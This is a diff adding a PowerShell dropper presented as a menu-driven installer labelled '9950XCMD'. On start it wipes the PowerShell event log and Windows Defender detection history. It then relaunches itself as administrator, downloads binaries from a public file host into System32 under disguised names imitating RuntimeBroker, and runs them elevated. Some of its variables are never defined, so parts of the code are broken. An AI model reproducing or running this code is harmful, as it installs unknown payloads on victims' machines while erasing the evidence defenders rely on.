@@ -1,0 +1,180 @@
+# ล้างประวัติเก่าทันทีที่เริ่ม
+wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+if (Test-Path "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory") {
+    Get-ChildItem -Path "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory" -Recurse | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+}
+
+# -----------------------------
+# Menu Selection
+# -----------------------------
+Write-Host "9950XCMD"
+Write-Host "1. Install & Run"
+Write-Host "2. Clean"
+
+$choice = Read-Host "Enter choice 1-2"
+
+# -----------------------------
+# Check for Administrator rights
+# -----------------------------
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
+    Write-Host "Restarting with Administrator privileges..."
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# -----------------------------
+# Define paths and variables
+# -----------------------------
+$system32Path = "$env:windir\System32"
+$exeDestination = Join-Path $system32Path "RuntimeBrokerssss.exe"
+$exeUrl = "https://files.catbox.moe/dbhkb7.bin"
+
+# ตัวเลือกที่ 3 - ไฟล์ fontexe
+$fontexeDestination = Join-Path $system32Path "fontexe.exe"
+$fontexeUrl = "https://files.catbox.moe/gox1ex.bin"
+
+# -----------------------------
+# Install & Run Mode (Option 1)
+# -----------------------------
+if ($choice -eq "1") {
+    Write-Host "`nStarting installation..."
+
+    # Check and download exe if not exists
+    if (Test-Path $exeDestination) {
+        Write-Host "RuntimeBrokerss.exe already exists, skipping download." -ForegroundColor Yellow
+    } else {
+        Write-Host "Downloading and renaming executable to RuntimeBrokerss.exe..."
+        try {
+            $tempFile = Join-Path $env:TEMP "seanual_temp.exe"
+            Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile
+            Move-Item -Path $tempFile -Destination $exeDestination -Force
+            Write-Host "RuntimeBrokerss.exe download completed." -ForegroundColor Green
+        } catch {
+            Write-Host "RuntimeBrokerss.exe download failed: $_" -ForegroundColor Red
+            exit
+        }
+    }
+
+    # Run the program directly
+    Write-Host "Starting the program..."
+    try {
+        Start-Process -FilePath $exeDestination -Verb RunAs
+        Write-Host "Program started successfully." -ForegroundColor Green
+    } catch {
+        Write-Host "Failed to start program: $_" -ForegroundColor Red
+    }
+
+    Write-Host "`nInstallation completed successfully." -ForegroundColor Green
+}
+
+# -----------------------------
+# Clean Mode (Option 2)
+# -----------------------------
+elseif ($choice -eq "2") {
+    Write-Host "Cleaning up installation..."
+
+    # Stop the process if running
+    Write-Host "Stopping RuntimeBrokerss.exe process..."
+    try {
+        Stop-Process -Name "RuntimeBrokerss" -Force -ErrorAction SilentlyContinue
+        Write-Host "Process stopped." -ForegroundColor Green
+    } catch {
+        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
+    }
+
+    # หยุด fontexe ด้วย
+    Write-Host "Stopping fontexe.exe process..."
+    try {
+        Stop-Process -Name "fontexe" -Force -ErrorAction SilentlyContinue
+        Write-Host "Process stopped." -ForegroundColor Green
+    } catch {
+        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
+    }
+
+    # Remove files if they exist
+    $removedFiles = @()
+    
+    if (Test-Path $exeDestination) { 
+        Remove-Item $exeDestination -Force 
+        $removedFiles += "RuntimeBrokerssss.exe"
+        Write-Host "Removed executable: $exeDestination" -ForegroundColor Green
+    } else {
+        Write-Host "RuntimeBrokerssss.exe not found, skipping removal." -ForegroundColor Yellow
+    }
+    
+    if (Test-Path $dllDestination) { 
+        Remove-Item $dllDestination -Force 
+        $removedFiles += "Guna.UI2.dll"
+        Write-Host "Removed DLL: $dllDestination" -ForegroundColor Green
+    } else {
+        Write-Host "Guna.UI2.dll not found, skipping removal." -ForegroundColor Yellow
+    }
+
+    if (Test-Path $fontexeDestination) {
+        Remove-Item $fontexeDestination -Force
+        $removedFiles += "fontexe.exe"
+        Write-Host "Removed executable: $fontexeDestination" -ForegroundColor Green
+    } else {
+        Write-Host "fontexe.exe not found, skipping removal." -ForegroundColor Yellow
+    }
+
+    if ($removedFiles.Count -eq 0) {
+        Write-Host "No files found to remove." -ForegroundColor Yellow
+    } else {
+        Write-Host "Removed files: $($removedFiles -join ', ')" -ForegroundColor Green
+    }
+
+    Write-Host "Cleanup completed." -ForegroundColor Green
+}
+
+# -----------------------------
+# Install & Run Mode for fontexe (Option 3)
+# -----------------------------
+elseif ($choice -eq "3") {
+    Write-Host "`nStarting installation for fontexe..."
+
+    # Check and download DLL if not exists (เหมือนเดิม)
+    if (Test-Path $dllDestination) {
+        Write-Host "Guna.UI2.dll already exists, skipping download." -ForegroundColor Yellow
+    } else {
+        Write-Host "Downloading Guna.UI2.dll..."
+        try {
+            Invoke-WebRequest -Uri $dllUrl -OutFile $dllDestination
+            Write-Host "Guna.UI2.dll download completed." -ForegroundColor Green
+        } catch {
+            Write-Host "Guna.UI2.dll download failed: $_" -ForegroundColor Red
+            exit
+        }
+    }
+
+    # Check and download fontexe if not exists
+    if (Test-Path $fontexeDestination) {
+        Write-Host "fontexe.exe already exists, skipping download." -ForegroundColor Yellow
+    } else {
+        Write-Host "Downloading fontexe.exe..."
+        try {
+            $tempFile = Join-Path $env:TEMP "fontexe_temp.exe"
+            Invoke-WebRequest -Uri $fontexeUrl -OutFile $tempFile
+            Move-Item -Path $tempFile -Destination $fontexeDestination -Force
+            Write-Host "fontexe.exe download completed." -ForegroundColor Green
+        } catch {
+            Write-Host "fontexe.exe download failed: $_" -ForegroundColor Red
+            exit
+        }
+    }
+
+    # Run the program directly
+    Write-Host "Starting fontexe.exe..."
+    try {
+        Start-Process -FilePath $fontexeDestination -Verb RunAs
+        Write-Host "fontexe.exe started successfully." -ForegroundColor Green
+    } catch {
+        Write-Host "Failed to start fontexe.exe: $_" -ForegroundColor Red
+    }
+
+    Write-Host "`nInstallation for fontexe completed successfully." -ForegroundColor Green
+}
+
+else {
+    Write-Host "Invalid choice (please select 1, 2, or 3)." -ForegroundColor Red
+}
